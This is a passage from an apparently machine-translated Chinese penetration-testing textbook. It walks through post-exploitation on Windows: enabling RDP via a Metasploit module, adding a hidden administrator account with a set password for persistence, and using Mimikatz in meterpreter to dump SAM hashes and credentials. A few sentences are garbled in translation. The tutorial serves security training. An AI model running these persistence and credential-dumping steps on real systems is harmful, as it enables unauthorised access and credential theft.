  \ Windows 机器上建立 meterpreter 会话（用于身份验证漏洞利用）。\n* 此外，通过本章较早部分解释的方法对哈希进行破解，我们可以检索明文用户名和密码。通过结合这两条信息，我们可以有效地在目标资产中建立并维持持久存在。\n\
  \n## 探索通过 RDP 进行横移动\n\n为了在受控系统上建立持久化，我们将在目标系统上启用远程桌面协议（RDP）并创建一个新用户。这将允许我们在任何需要时保持访问并使用远程桌面以及新创建的用户。\n\
  \n现在让我们逐步检查这种方法：\n\n1. 首先，执行命令 `background` 将当前的 meterpreter 会话移动到后台。然后，按照以下命令序列在目标系统上启用\
  \ RDP，如图图 8.51 所示：\n\n```\nuse post/windows/manage/enable_rdp\nset SESSION 1\nrun\n\
  ```\n\n![](img/Figure_8.51.png)\n\n图 8.51：启用 RDP\n\n2. 若要重新访问 meterpreter 会话，使用命令\
  \ `sessions -1`。然后，执行命令 `shell` 以在受控系统上获取 shell，如图图 8.52 所示：\n\n![](img/Figure_8.52.png)\n\
  \n图 8.52：在受控系统上获取 shell\n\n3. 从那里，通过执行以下命令集添加一个具有管理员权限的新用户，如图图 8.53 所示：\n\n```\n\
  net user ummedmeel pass@123 /add\nnet localgroup Administrators ummedmeel /add\n\
  ```\n\n![](img/Figure_8.53.png)\n\n图 8.53：添加具有管理员权限的新用户\n\n4. 打开 RDP 客户端并输入受控系统的\
  \ IP 地址。点击“连接”建立连接。提供用户名和密码，然后点击“确定”，如图图 8.54 所示：\n\n![](img/Figure_8.54.png)\n\n\
  图 8.54：连接远程桌面\n\n5. 搞定！我们已成功获取了对目标系统的远程桌面访问，如图图 8.55 所示：\n\n![](img/Figure_8.55.png)\n\
  \n图 8.55：获取远程桌面访问\n\n从该场景中可以得出以下用例：\n\n* 安装网络监控工具以有效监控网络流量。\n* 利用受控系统作为启动平台安装黑客工具并跳转以攻破整个网络。\n\
  * 在受控系统上托管恶意应用程序或程序。\n* 将受控系统作为恶意目的的代理服务器。\n* 在域系统中，可能攻破整个 Active Directory (AD)\
  \ 网络。\n\n### 在 meterpreter 中释放 Mimikatz 的威力\n\n发现 Mimikatz 的巨大潜力，这是一种用于提取和操纵 Windows\
  \ 系统内凭据的后渗透工具。与 meterpreter 的高级功能集成时，它变成了渗透测试人员无价的资产。让我们深入探索 Mimikatz 在 meterpreter\
  \ 框架内无缝集成所提供的动态能力。\n\n1. 在继续之前，验证当前的 meterpreter 会话具有系统级访问权限至关重要。要确认这一点，执行命令 `getuid`，如图图\
  \ 8.56：\n\n![](img/Figure_8.56.png)\n\n图 8.56：执行命令 getuid\n\n2. 若要将 Mimikatz 模块加载到内存，执行命令\
  \ `load kiwi`。Metasploit 为 Mimikatz 提供了一系列内置命令；但使用 `kiwi_cmd` 选项可以获得对 Mimikatz 所有可用功能的无限制访问。见图图\
  \ 8.57：\n\n![](img/Figure_8.57.png)\n\n图 8.57：将 Mimikatz 模块加载到内存\n\n3. 若要查看可用模块的完整列表，运行命令\
  \ `help kiwi`，如图图 8.58 所示：\n\n![](img/Figure_8.58.png)\n\n图 8.58：可用模块列表\n\n4. 若要从\
  \ SAM 文件中提取哈希，执行命令 `lsa_dump_sam`，如图图 8.59 所示：\n\n![](img/Figure_8.59.png)\n\n图\
  \ 8.59：从 SAM 文件中提取哈希\n\n\n\n\n\n5. 此外，可以使用 `creds_all` 命令提取并转储哈希值，如图 8.60\n\n图 8.60：凭据及相关哈希\n\
  \n| 注意：Mimikatz 还采用了金票攻击（golden ticket）和银票攻击等高级技术，提供了持久访问并在受损的网络中实现横向移动。此外，它还了凭据操纵、键盘记录、证书管理和虚拟智能卡创建，以进一步增强其能力。\
  \ |\n\n## 结论](#contents.xhtml_sc2_237a)\n\n总之，本章提供了关于权限提升、哈希破解和网络跳转的全面旅程。你对密码的安全保护与破解有了深入见解，探索了精英和在线工具，并理解了哈希、加密和编码之间的区别。此外还强调了后渗透和横向移动的重要性，以及持久访问和权限提升的策略。所获得的知识将增强你作为渗透测试员的技能，使能够发现漏洞、加固安全措施并应对复杂场景以有效保护系统和网络。\n\
  \n在接下来的章节中，我们将探索计算机网络中绕过安全控制的艺术。这包括绕过 Windows 安全控制、反病毒安全控制和防火墙安全控制。我们还将深入研究社会工程以及用于渗透测试和网络成熟度评估的各种杂项技术。本章将为评估和增强计算机网络安全控制的有效性提供价值见解和技能。\n\
